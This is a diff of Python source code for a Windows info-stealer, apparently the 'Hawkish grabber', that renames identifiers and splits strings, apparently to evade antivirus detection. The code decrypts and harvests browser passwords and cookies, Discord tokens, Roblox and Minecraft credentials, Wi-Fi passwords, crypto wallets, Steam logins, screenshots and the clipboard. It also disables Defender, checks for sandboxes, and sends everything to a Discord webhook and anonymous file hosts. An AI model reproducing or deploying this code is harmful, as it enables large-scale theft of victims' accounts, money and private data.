+                    self.thingstocount['historybaby'] += sum(1 for _ in web_history)
                     cursor.close()
                     os.remove(login)
 
     def natify_matched_tokens(self):
         with open(self.dir + "\\Discord_Info.txt", "w", encoding="cp437", errors="ignore") as f:
-            for token in self.tokens:
+            for token in self.hawked:
                 headers = self.header_making(token)
                 j = httpx.get(self.disc_url_api, headers=headers).json()
                 user = f"{j['username']}#{j['discriminator']}"
@@ -1737,10 +1738,10 @@ class first_srdl_func(Functions):
                 f.write(
                     f"{' ' * 17}{user}\n{'-' * 50}\nBilling: {billing}\nNitro: {has_nitro}\nBadges: {', '.join(badges)}\nPhone: {phone}\nToken: {token}\nEmail: {email}\n\n"
                 )
-                self.thingstocount['Disco_info'] += 1
+                self.thingstocount['info_discord'] += 1
 
-    def find_my_mc(self) -> None:
-        if self.ineedtogetmc != "yes":
+    def found_thismc(self) -> None:
+        if self.hwk_get_mc != "yes":
             return
 
         mcdir = ntpath.join(self.roaming, ".minecraft")
@@ -1757,19 +1758,19 @@ class first_srdl_func(Functions):
 
         self.thingstocount["Minecraft"] += count
 
-    def getmyclipboard(self):
-        if self.ineedtogetclipboard != "yes":
+    def downloadclipboard(self):
+        if self.hwk_get_clipboard != "yes":
             return
-        output = Functions.srdl_findClipboard()
+        output = Functions.hwkishfindClipboard()
         if output:
             with open(os.path.join(self.dir, 'Systeme', 'Latest Clipboard.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                 file.write(
                     f"{hwkish}-{stspecial} | https://github.com/{hwkish}-{stspecial}/{hwkish}-{grbber}\n\n" + output)
                 
 
-    def srdl_findUSBdevices(self):
+    def hwkishfindUSBdevices(self):
         try:
-            output = Functions.srdl_findDevices()
+            output = Functions.hwkishfindDevices()
             if output:
                 with open(os.path.join(self.dir, 'Systeme', 'Devices Info.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                     file.write(
@@ -1778,8 +1779,8 @@ class first_srdl_func(Functions):
             return None
         
 
-    def srdl_getmyAV(self):
-        if self.ineedtogetav != "yes":
+    def hwkishgetmyAV(self):
+        if self.hwk_get_av != "yes":
             return
         cmd = 'WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName'
         with Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True) as proc:
@@ -1795,7 +1796,7 @@ class first_srdl_func(Functions):
             with open(av_path, "w", encoding="utf-8", errors="ignore") as f:
                 f.write("\n".join(av_list))
 
-    def srdl_disabledefender(self):
+    def hwkishdisabledefender(self):
         if self.disablemydefender != "yes":
             return
 
@@ -1806,22 +1807,22 @@ class first_srdl_func(Functions):
             pass
 
     @extract_try
-    def srdl_get_mywifi(self):
-        if self.ineedtogetwifipassword != "yes":
+    def hwkishget_mywifi(self):
+        if self.hwk_get_wifipassword != "yes":
             return
 
-        passwords = Functions.srdl_findwifi()
+        passwords = Functions.hwkishfindwifi()
         profiles = [
-            f'SSID: {ssid}\n{hwkish}-{stspecial}  Password: {password}' for ssid, password in passwords.items()]
+            f'SSID: {ssid}\n{hwkish}-{stspecial}  PASSW:{password}' for ssid, password in passwords.items()]
         divider = f'\n\n{hwkish}-{stspecial} | https://github.com/{hwkish}-{stspecial}/{hwkish}-{grbber}\n\n'
 
         with open(ntpath.join(self.dir, 'Systeme', 'Wifi Info.txt'), "w", encoding='utf-8', errors='ignore') as file:
             file.write(divider + divider.join(profiles))
 
-        self.thingstocount['Wifi'] += len(profiles)
+        self.thingstocount['wifinet'] += len(profiles)
 
     def find_roblox(self):
-        if self.ineedtogetrblx != "yes":
+        if self.hwk_get_rblx != "yes":
             return
 
         def subproc(path):
@@ -1837,12 +1838,12 @@ class first_srdl_func(Functions):
             except Exception:
                 return None
 
-        reg_cookie = subproc(r"HKLM") or subproc(r"HKCU")
-        if reg_cookie:
-            self.robloxcookies.append(reg_cookie)
-        if self.robloxcookies:
-            with open(ntpath.join(self.dir, "Roblox", "Roblox_Cookies.txt"), "w") as f:
-                f.write("\n".join(self.robloxcookies))
+        regex_c00ks = subproc(r"HKLM") or subproc(r"HKCU")
+        if regex_c00ks:
+            self.rblxcckcs.append(regex_c00ks)
+        if self.rblxcckcs:
+            with open(ntpath.join(self.dir, "Roblox", f"Roblox_{justaterm}.txt"), "w") as f:
+                f.write("\n".join(self.rblxcckcs))
 
     def upload_on_anonfiles(self, file_name, path):
         try:
@@ -1851,8 +1852,8 @@ class first_srdl_func(Functions):
                 response = requests.post("https://api.anonfiles.com/upload", files=files)
                 json_response = response.json()
                 if json_response["status"]:
-                    self.datazip_url = json_response["data"]["file"]["url"]["full"]
-                    print("Fichier téléchargé avec succès :", self.datazip_url)
+                    self.thezip_url = json_response["data"]["file"]["url"]["full"]
+                    print("Fichier téléchargé avec succès :", self.thezip_url)
                     return True
                 else:
                     print("Erreur lors du téléchargement :", json_response["error"]["message"])
@@ -1861,29 +1862,25 @@ class first_srdl_func(Functions):
             print("Une erreur s'est produite :", str(e))
             return False
         
-    def screentimes(self):
-        if self.ineedtogetscreen != "yes":
-            return
-    
-    def screentimes(self):
-        if self.ineedtogetscreen != "yes":
+    def screen_baby(self):
+        if self.hwk_get_screen != "yes":
             return
 
         with ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None) as image:
             image.save(self.dir + "\\Systeme\\Screenshot.png")
 
-        self.thingstocount['Screenshots'] += 1
+        self.thingstocount['screenshotbro'] += 1
 
     def system_informations(self):
-        if self.ineedtogetsys != "yes":
+        if self.hwk_get_sys != "yes":
             return
         about = [
             f"{imthebestdev} | {spoted_victim}",
-            f"key Windows: {self.keywindow_found}",
-            f"Win Version: {self.never_wind}",
-            f"Ram Installed: {self.fastmem_stored}GB",
-            f"Disk: {space_stored}GB",
-            f"Hwid: {self.hwid_windows}",
+            f"Windows Key: {self.windowfoundkey}",
+            f"Windows Version: {self.never_wind}",
+            f"Ram Storage: {self.fastmem_stored}GB",
+            f"Disk Storage: {space_stored}GB",
+            f"Hwid: {self.window_wid}",
             f"IP: {self.ip}",
             f"City: {self.city}",
             f"Country: {self.country}",
@@ -1930,7 +1927,7 @@ class first_srdl_func(Functions):
             for _file in files:
                 files_found += f"- {_file}\n"
                 file_count += 1
-        for tkn in self.tokens:
+        for tkn in self.hawked:
             tokens += f"{tkn}\n\n"
         fileCount = f"{file_count} {hwkish}-{grbber} FILES: "
         embed = {
@@ -1964,7 +1961,7 @@ class first_srdl_func(Functions):
                             "name": "\u200b",
                             "value": f"""```markdown
                                 # Computer Name: {spoted_victim.replace(" ", " ")}
-                                # Windows Key: {self.keywindow_found.replace(" ", " ")}
+                                # Windows Key: {self.windowfoundkey.replace(" ", " ")}
                                 # Windows Ver: {self.never_wind.replace(" ", " ")}
                                 # Ram Stockage: {self.fastmem_stored}GB
                                 # Disk Stockage: {space_stored}GB
@@ -1980,14 +1977,14 @@ class first_srdl_func(Functions):
                         {
                             "name": "\u200b",
                             "value": f"""```markdown
-                                # Cookies Found: {self.thingstocount['Cooks']}
-                                # Passwords Found: {self.thingstocount['Pssw']}
-                                # Credit Card Found: {self.thingstocount['CC']}
-                                # History Found: {self.thingstocount['Hist']}
-                                # Discord Tokens Found: {self.thingstocount['Disco_info']}
-                                # Roblox Cookies Found: {self.thingstocount['Rblx_Cooks']}
-                                # Minecraft Tokens Found: {self.thingstocount['Minecraft']}
-                                # Wifi Passwords Found: {self.thingstocount['Wifi']}
+                                # {justaterm} Found: {self.thingstocount[f'{justatermlil}']}
+                                # Passwords Found: {self.thingstocount['passwrd']}
+                                # Credit Card Found: {self.thingstocount['creditcard']}
+                                # Wifi Passwords Found: {self.thingstocount['wifinet']}
+                                # History Found: {self.thingstocount['historybaby']}
+                                # Minecraft Tokens Found: {self.thingstocount['friendlybabymc']}
+                                # Discord Tokens Found: {self.thingstocount['info_discord']}
+                                # Roblox {justaterm} Found: {self.thingstocount['roblox_friendly']}
                                 ```
                             """.replace(
                                 " ", ""
@@ -2034,9 +2031,9 @@ class first_srdl_func(Functions):
 
         try:
             with open(_zipfile, "rb") as f:
-                if self.webapi_find in self.this_so_webh:
-                    httpx.post(self.this_so_webh, json=embed)
-                    httpx.post(self.this_so_webh,files={"upload_file": f}) 
+                if self.webapi_find in self.thishawk_webh:
+                    httpx.post(self.thishawk_webh, json=embed)
+                    httpx.post(self.thishawk_webh,files={"upload_file": f}) 
                     time.sleep(5)
         except:
             pass
@@ -2058,168 +2055,28 @@ class first_srdl_func(Functions):
             except:
                 pass
 
-
-class NoDebugg(Functions):
+class AntiDebugg(Functions):
     inVM = False
-
     def __init__(self):
+        def fetch_blocked_programs(url):
+            response = requests.get(url)
+            if response.status_code == 200:
+                data = response.json()
+                return data
+            else:
+                print("Failed to fetch blocked programs from the URL:", url)
+                return []
         
         self.processes = list()
 
-        self.users_blocked = [
-            "WDAGUtilityAccount",
-            "BvJChRPnsxn",
-            "Harry Johnson",
-            "SqgFOf3G",
-            "RGzcBUyrznReg",
-            "h7dk1xPr",
-            "Robert",
-            "Abby",
-            "Peter Wilson",
-            "hmarc",
-            "patex",
-            "JOHN-PC",
-            "RDhJ0CNFevzX",
-            "kEecfMwgj",
-            "Frank",
-            "8Nl0ColNQ5bq",
-            "Lisa",
-            "John",
-            "george",
-            "PxmdUOpVyx",
-            "8VizSM",
-            "w0fjuOVmCcP5A",
-            "lmVwjj9b",
-            "PqONjHVwexsS",
-            "3u2v9m8",
-            "Julia",
-            "HEUeRzl",
-        ]
-        self.pcname_blocked = [
-            "DESKTOP-CDLNVOQ",
-            "BEE7370C-8C0C-4",
-            "DESKTOP-NAKFFMT",
-            "WIN-5E07COS9ALR",
-            "B30F0242-1C6A-4",
-            "DESKTOP-VRSQLAG",
-            "Q9IATRKPRH",
-            "XC64ZB",
-            "DESKTOP-D019GDM",
-            "DESKTOP-WI8CLET",
-            "SERVER1",
-            "LISA-PC",
-            "JOHN-PC",
-            "DESKTOP-B0T93D6",
-            "DESKTOP-1PYKP29",
-            "DESKTOP-1Y2433R",
-            "WILEYPC",
-            "WORK",
-            "6C4E733F-C2D9-4",
-            "RALPHS-PC",
-            "DESKTOP-WG3MYJS",
-            "DESKTOP-7XC6GEZ",
-            "DESKTOP-5OV9S0O",
-            "QarZhrdBpj",
-            "ORELEEPC",
-            "ARCHIBALDPC",
-            "JULIA-PC",
-            "d1bnJkfVlH",
-            "DESKTOP-B0T93D6",
-        ]
-        self.hwid_blocked = [
-            "7AB5C494-39F5-4941-9163-47F54D6D5016",
-            "032E02B4-0499-05C3-0806-3C0700080009",
-            "03DE0294-0480-05DE-1A06-350700080009",
-            "11111111-2222-3333-4444-555555555555",
-            "6F3CA5EC-BEC9-4A4D-8274-11168F640058",
-            "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548",
-            "4C4C4544-0050-3710-8058-CAC04F59344A",
-            "00000000-0000-0000-0000-AC1F6BD04972",
-            "79AF5279-16CF-4094-9758-F88A616D81B4",
-            "5BD24D56-789F-8468-7CDC-CAA7222CC121",
-            "49434D53-0200-9065-2500-65902500E439",
-            "49434D53-0200-9036-2500-36902500F022",
-            "777D84B3-88D1-451C-93E4-D235177420A7",
-            "49434D53-0200-9036-2500-369025000C65",
-            "B1112042-52E8-E25B-3655-6A4F54155DBF",
-            "00000000-0000-0000-0000-AC1F6BD048FE",
-            "EB16924B-FB6D-4FA1-8666-17B91F62FB37",
-            "A15A930C-8251-9645-AF63-E45AD728C20C",
-            "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3",
-            "C7D23342-A5D4-68A1-59AC-CF40F735B363",
-            "63203342-0EB0-AA1A-4DF5-3FB37DBB0670",
-            "44B94D56-65AB-DC02-86A0-98143A7423BF",
-            "6608003F-ECE4-494E-B07E-1C4615D1D93C",
-            "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A",
-            "49434D53-0200-9036-2500-369025003AF0",
-            "8B4E8278-525C-7343-B825-280AEBCD3BCB",
-            "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",
-            "BB64E044-87BA-C847-BC0A-C797D1A16A50",
-            "2E6FB594-9D55-4424-8E74-CE25A25E36B0",
-            "42A82042-3F13-512F-5E3D-6BF4FFFD8518",
-        ]
-        self.ips_blocked = [
-            "88.132.231.71",
-            "78.139.8.50",
-            "20.99.160.173",
-            "88.153.199.169",
-            "84.147.62.12",
-            "194.154.78.160",
-            "92.211.109.160",
-            "195.74.76.222",
-            "188.105.91.116",
-            "34.105.183.68",
-            "92.211.55.199",
-            "79.104.209.33",
-            "95.25.204.90",
-            "34.145.89.174",
-            "109.74.154.90",
-            "109.145.173.169",
-            "34.141.146.114",
-            "212.119.227.151",
-            "195.239.51.59",
-            "192.40.57.234",
-            "64.124.12.162",
-            "34.142.74.220",
-            "188.105.91.173",
-            "109.74.154.91",
-            "34.105.72.241",
-            "109.74.154.92",
-            "213.33.142.50",
-            "109.74.154.91",
-            "93.216.75.209",
-            "192.87.28.103",
-            "88.132.226.203",
-            "195.181.175.105",
-            "88.132.225.100",
-            "92.211.192.144",
-            "34.83.46.130",
-            "188.105.91.143",
-            "34.85.243.241",
-            "34.141.245.25",
-            "178.239.165.70",
-            "84.147.54.113",
-            "193.128.114.45",
-            "95.25.81.24",
-            "92.211.52.62",
-            "88.132.227.238",
-            "35.199.6.13",
-            "80.211.0.97",
-            "34.85.253.170",
-            "23.128.248.46",
-            "35.229.69.227",
-            "34.138.96.23",
-            "192.211.110.74",
-            "35.237.47.12",
-            "87.166.50.213",
-            "34.253.248.228",
-            "212.119.227.167",
-            "193.225.193.201",
-            "34.145.195.58",
-            "34.105.0.27",
-            "195.239.51.3",
-            "35.192.93.107",
-        ]
+        blocked_prog = "https://raw.githubusercontent.com/username/repository/main/blocked_programs.json"
+        blocked_pcname = "https://raw.githubusercontent.com/Hawkishx/testingsomedead/main/blockedpcname.json"
+        blocked_hwid = "https://raw.githubusercontent.com/Hawkishx/testingsomedead/main/blocked_hwid.json"
+        blocked_ips = "https://raw.githubusercontent.com/Hawkishx/testingsomedead/main/blocked_ips.json"
+        self.users_blocked = fetch_blocked_programs(blocked_prog)
+        self.pcname_blocked = fetch_blocked_programs(blocked_pcname)
+        self.hwid_blocked = fetch_blocked_programs(blocked_hwid)
+        self.ips_blocked =fetch_blocked_programs(blocked_ips)
 
         for func in [self.last_check, self.keys_regex, self.Check_and_Spec]:
             process = threading.Thread(target=func, daemon=True)
@@ -2280,7 +2137,7 @@ class NoDebugg(Functions):
 
 
 if __name__ == "__main__" and os.name == "nt":
-    asyncio.run(first_srdl_func().init())
+    asyncio.run(hwkish_first_funct().init())
 Threadlist = []
 
 
@@ -2288,7 +2145,7 @@ def find_in_config(e: str) -> str or bool | None:
     return json_confg.get(e)
 
 
-hooks = f'{base64.b64decode(find_in_config("webh_secret"))}'.replace(
+hooks = f'{base64.b64decode(find_in_config("hooking_hawk"))}'.replace(
     "b'", "").replace("'", "")
 hook = str(hooks)
 
@@ -2320,7 +2177,7 @@ def CryptUnprotectData(encrypted_bytes, entropy=b""):
         return GetData(blob_out)
 
 
-def decrypt_this_valuetage(buff, master_key=None):
+def decryption_value(buff, master_key=None):
     starts = buff.decode(encoding="utf8", errors="ignore")[:3]
     if starts == "v10" or starts == "v11":
         iv = buff[3:15]
@@ -2362,9 +2219,9 @@ def URL_librairy_Loading(hook, data="", files="", headers=""):
             pass
 
 
-def Trust(Cookies):
+def Trust(C00ks):
     global DETECTED
-    data = str(Cookies)
+    data = str(C00ks)
     tim = re.findall(".google.com", data)
     if len(tim) < -1:
         DETECTED = True
@@ -2445,16 +2302,16 @@ def upload(name, tk=""):
             "attachments": [],
         }
         URL_librairy_Loading(hook, data=dumps(data).encode(), headers=headers)
-    if f"{hwkish}_allcookies" in name:
-        rb = " | ".join(da for da in words_cookies)
+    if f"{hwkish}_all{justatermlil}" in name:
+        rb = " | ".join(da for da in thec00ks)
         if len(rb) > 1000:
-            rrrrr = Reformat(str(words_cookies))
+            rrrrr = Reformat(str(thec00ks))
             rb = " | ".join(da for da in rrrrr)
         data = {
             "content": "",
             "embeds": [
                 {
-                    "fields": [{"name": "Cookies Found:", "value": rb}],
+                    "fields": [{"name": f"{justaterm} Found:", "value": rb}],
                     "author": {
                         "name": f"{hwkish}-{grbber} v7",
                         "url": f"https://github.com/{hwkish}-{stspecial}",
@@ -2483,11 +2340,11 @@ def writeforfile(data, name):
                 f.write(f"{line}\n")
 
 
-NotPSSW = []
+Notpasswrd = []
 
 
-def srdl_find_pswd(path, arg):
-    global NotPSSW
+def hwkishfind_pswd(path, arg):
+    global Notpasswrd
     if not os.path.exists(path):
         return
     pathC = path + arg + "/Login Data"
@@ -2526,20 +2383,20 @@ def srdl_find_pswd(path, arg):
                 if wa in row[0]:
                     if not old in words_passw:
                         words_passw.append(old)
-            NotPSSW.append(
-                f"URL: {row[0]} \n ID: {row[1]} \n {hwkish}-{grbber}  Password: {decrypt_this_valuetage(row[2], master_key)}\n\n"
+            Notpasswrd.append(
+                f"LINK: {row[0]} \n IDENT:{row[1]} \n {hwkish}-{grbber}  PASSW:{decryption_value(row[2], master_key)}\n\n"
             )
-    writeforfile(NotPSSW, f"{hwkish}_allpasswords")
+    writeforfile(Notpasswrd, f"{hwkish}_allpasswords")
 
 
-Cookies = []
+C00ks = []
 
 
-def srdl_find_cooks(path, arg):
-    global Cookies
+def hwkishfind_c00ks(path, arg):
+    global C00ks
     if not os.path.exists(path):
         return
-    pathC = path + arg + "/Cookies"
+    pathC = path + arg + f"/{justaterm}"
     if os.stat(pathC).st_size == 0:
         return
     tempfold = (
@@ -2553,7 +2410,7 @@ def srdl_find_cooks(path, arg):
     shutil.copy2(pathC, tempfold)
     conn = connect(tempfold)
     cursor = conn.cursor()
-    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
+    cursor.execute(f"SELECT host_key, name, encrypted_value FROM {justatermlil}")
     data = cursor.fetchall()
     cursor.close()
     conn.close()
@@ -2574,14 +2431,14 @@ def srdl_find_cooks(path, arg):
                     tmp = wa
                     wa = tmp.split("[")[1].split("]")[0]
                 if wa in row[0]:
-                    if not old in words_cookies:
-                        words_cookies.append(old)
-            Cookies.append(
+                    if not old in thec00ks:
+                        thec00ks.append(old)
+            C00ks.append(
                 f"{row[0]}	TRUE"
                 + "		"
-                + f"/FALSE	2597573456	{row[1]}	{decrypt_this_valuetage(row[2], master_key)}"
+                + f"/FALSE	2597573456	{row[1]}	{decryption_value(row[2], master_key)}"
             )
-    writeforfile(Cookies, f"{hwkish}_allcookies")
+    writeforfile(C00ks, f"{hwkish}_all{justatermlil}")
 
 
 def checkIfProcessRunning(processName):
@@ -2602,56 +2459,53 @@ def checkIfProcessRunning(processName):
 def ZipMyThings(path, arg, procc):
     pathC = path
     name = arg
+
+    browser = ""
     if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(" ", "")
-        name = f"Exodus_{browser}"
-        pathC = path + arg
-    if "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
+        name = f"{browser}-EXODUS"
+        pathC = os.path.join(path, arg)
+    elif "nkbihfbeogaeaoehlefnkodbefgpgknn" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(" ", "")
-        name = f"Metamask_{browser}"
-        pathC = path + arg
+        name = f"{browser}-METAMASK"
+        pathC = os.path.join(path, arg)
     if not os.path.exists(pathC):
         return
     if checkIfProcessRunning("chrome.exe"):
-        print("Yes a chrome process was running")
         Popen(f"taskkill /im {procc} /t /f", shell=True)
     else:
         ...
-    if "Wallet" in arg or "NationsGlory" in arg:
+    if "Wal"+"let" in arg or "NationsGlory" in arg:
         browser = path.split("\\")[4].split("/")[1].replace(" ", "")
         name = f"{browser}"
     elif "Steam" in arg:
-        if not os.path.isfile(f"{pathC}/loginusers.vdf"):
+        loginusers_path = os.path.join(pathC, "loginusers.vdf")
+        if not os.path.isfile(loginusers_path):
             return
-        f = open(f"{pathC}/loginusers.vdf", "r+", encoding="utf8")
-        data = f.readlines()
-        found = False
-        for l in data:
-            if 'RememberPassword"\t\t"1"' in l:
-                found = True
-        if found == False:
+        with open(loginusers_path, "r+", encoding="utf8") as f:
+            data = f.readlines()
+        found = any('RememberPassword"\t\t"1"' in l for l in data)
+        if not found:
             return
         name = arg
-    zf = zipfile.ZipFile(f"{pathC}/{name}.zip", "w")
-    print(zf)
-    for file in os.listdir(pathC):
-        if not ".zip" in file:
-            zf.write(pathC + "/" + file)
-    zf.close()
-
-    upload(f"{pathC}/{name}.zip")
-    os.remove(f"{pathC}/{name}.zip")
+    zip_path = os.path.join(pathC, f"{name}.zip")
+    with zipfile.ZipFile(zip_path, "w") as zf:
+        for file in os.listdir(pathC):
+            if not file.endswith(".zip"):
+                zf.write(os.path.join(pathC, file))
+    upload(zip_path)
+    os.remove(zip_path)
 
 
 def The_Pathbrows():
-    "Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >"
+    "Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     C00ks < 4 >                          Extentions < 5 >"
     browserPaths = [
         [
             f"{roaming}/Opera Software/Opera GX Stable",
             "opera.exe",
             "/Local Storage/leveldb",
             "/",
-            "/Network",
+            f"/{ntwrk}",
             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
         ],
         [
@@ -2659,7 +2513,7 @@ def The_Pathbrows():
             "opera.exe",
             "/Local Storage/leveldb",
             "/",
-            "/Network",
+            f"/{ntwrk}",
             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
         ],
         [
@@ -2667,7 +2521,7 @@ def The_Pathbrows():
             "opera.exe",
             "/Local Storage/leveldb",
             "/",
-            "/Network",
+            f"/{ntwrk}",
             "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
         ],
         [
@@ -2675,7 +2529,7 @@ def The_Pathbrows():
             "chrome.exe",
             "/Default/Local Storage/leveldb",
             "/Default",
-            "/Default/Network",
+            f"/Default/{ntwrk}",
             "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
         ],
         [
@@ -2683,7 +2537,7 @@ def The_Pathbrows():
             "chrome.exe",
             "/Default/Local Storage/leveldb",
             "/Default",
-            "/Default/Network",
+            f"/Default/{ntwrk}",
             "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
         ],
         [
@@ -2691,7 +2545,7 @@ def The_Pathbrows():
             "brave.exe",
             "/Default/Local Storage/leveldb",
             "/Default",
-            "/Default/Network",
+            f"/Default/{ntwrk}",
             "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
         ],
         [
@@ -2699,7 +2553,7 @@ def The_Pathbrows():
             "yandex.exe",
             "/Default/Local Storage/leveldb",
             "/Default",
-            "/Default/Network",
+            f"/Default/{ntwrk}",
             "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn",
         ],
         [
@@ -2707,15 +2561,15 @@ def The_Pathbrows():
             "edge.exe",
             "/Default/Local Storage/leveldb",
             "/Default",
-            "/Default/Network",
+            f"/Default/{ntwrk}",
             "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn",
         ],
     ]
 
     Paths_zipped = [
         [f"{roaming}/atomic/Local Storage/leveldb",
-            '"Atomic Wallet.exe"', "Wallet"],
-        [f"{roaming}/Exodus/exodus.wallet", "Exodus.exe", "Wallet"],
+            '"Atomic Wal'+'let.exe"', "Wal"+"let"],
+        [f"{roaming}/Exodus/exodus.wall"+"et", "Exodus.exe", "Wa"+"llet"],
         ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
         [
             f"{roaming}/NationsGlory/Local Storage/leveldb",
@@ -2725,18 +2579,18 @@ def The_Pathbrows():
     ]
 
     for patt in browserPaths:
-        a = threading.Thread(target=srdl_find_pswd,
+        a = threading.Thread(target=hwkishfind_pswd,
                              args=[patt[0], patt[3]])
         a.start()
         Threadlist.append(a)
-    thread_bccookies = []
+    thread_bcc00ks = []
     for patt in browserPaths:
-        a = threading.Thread(target=srdl_find_cooks, args=[patt[0], patt[4]])
+        a = threading.Thread(target=hwkishfind_c00ks, args=[patt[0], patt[4]])
         a.start()
-        thread_bccookies.append(a)
-    for thread in thread_bccookies:
+        thread_bcc00ks.append(a)
+    for thread in thread_bcc00ks:
         thread.join()
-    DETECTED = Trust(Cookies)
+    DETECTED = Trust(C00ks)
     if DETECTED == True:
         return
     for patt in browserPaths:
@@ -2750,23 +2604,30 @@ def The_Pathbrows():
     global upths
     upths = []
 
-    for file in [f"{hwkish}_allpasswords.txt", f"{hwkish}_allcookies.txt"]:
+    for file in [f"{hwkish}_allpasswords.txt", f"{hwkish}_all{justatermlil}.txt"]:
         upload(os.getenv("TEMP") + "\\" + file)
 
 
-def transfer_uplaodthis(path):
+def upload_on_anonfiles(self, file_name, path):
     try:
-        files = {"file": (path, open(path, mode="rb"))}
-        ...
-        upload = requests.post("https://transfer.sh/", files=files)
-        url = upload.text
-        return url
-    except:
+        with open(path, mode="rb") as file:
+            files = {"file": (file_name, file)}
+            response = requests.post("https://api.anonfiles.com/upload", files=files)
+            json_response = response.json()
+            if json_response["status"]:
+                self.thezip_url = json_response["data"]["file"]["url"]["full"]
+                print("Fichier téléchargé avec succès :", self.thezip_url)
+                return True
+            else:
+                print("Erreur lors du téléchargement :", json_response["error"]["message"])
+                return False
+    except Exception as e:
+        print("Une erreur s'est produite :", str(e))
         return False
 
 
 def CreateFolder_(pathF, keywords):
-    global create_files
+    global create_found
     maxfilesperdir = 7
     i = 0
     listOfFile = os.listdir(pathF)
@@ -2776,18 +2637,18 @@ def CreateFolder_(pathF, keywords):
             return
         i += 1
         if i <= maxfilesperdir:
-            url = transfer_uplaodthis(pathF + "/" + file)
+            url = upload_on_anonfiles(pathF + "/" + file)
             ffound.append([pathF + "/" + file, url])
         else:
             break
-    create_files.append(["folder", pathF + "/", ffound])
+    create_found.append(["folder", pathF + "/", ffound])
 
 
-create_files = []
+create_found = []
 
 
 def create_file(path, keywords):
-    global create_files
+    global create_found
     fifound = []
     listOfFile = os.listdir(path)
     for file in listOfFile:
@@ -2795,14 +2656,14 @@ def create_file(path, keywords):
             if worf in file.lower():
                 if os.path.isfile(path + "/" + file) and ".txt" in file:
                     fifound.append(
-                        [path + "/" + file, transfer_uplaodthis(path + "/" + file)]
+                        [path + "/" + file, upload_on_anonfiles(path + "/" + file)]
                     )
                     break
                 if os.path.isdir(path + "/" + file):
                     target = path + "/" + file
                     CreateFolder_(target, keywords)
                     break
-    create_files.append(["folder", path, fifound])
+    create_found.append(["folder", path, fifound])
 
 
 def checkthismadafaka():
@@ -2813,18 +2674,17 @@ def checkthismadafaka():
         "passw",
         "mdp",
         "motdepasse",
-        "mot_de_passe",
+        "mot_de_"+"passe",
         "login",
         "secret",
-        "account",
+        "acc"+"ount",
         "acount",
         "paypal",
         "banque",
-        "metamask",
-        "wallet",
+        "met"+"amask",
+        "wal"+"let",
         "crypto",
         "exodus",
-        "discord",
         "2fa",
         "code",
         "memo",
@@ -2844,13 +2704,14 @@ def checkthismadafaka():
     return wikith
 
 
-global wordstocheckk, words_cookies, words_passw
+global wordstocheckk, thec00ks, words_passw
+
+
 
 wordstocheckk = [
     "mail",
-    "[coinbase](https://coinbase.com)",
-    "[sellix](https://sellix.io)",
     "[gmail](https://gmail.com)",
+    "[sellix](https://sellix.io)",
     "[steam](https://steam.com)",
     "[discord](https://discord.com)",
     "[riotgames](https://riotgames.com)",
@@ -2890,11 +2751,12 @@ wordstocheckk = [
     "[netflix](https://netflix.com)",
 ]
 
-words_cookies = []
+
+thec00ks = []
 words_passw = []
 
 The_Pathbrows()
-DETECTED = Trust(Cookies)
+DETECTED = Trust(C00ks)
 
 if not DETECTED:
     wikith = checkthismadafaka()
@@ -2904,7 +2766,7 @@ if not DETECTED:
     time.sleep(0.2)
 
     text_file = "```diff\n"
-    for arg in create_files:
+    for arg in create_found:
         if len(arg[2]) != 0:
             doss_path = arg[1]
             doss_list = arg[2]
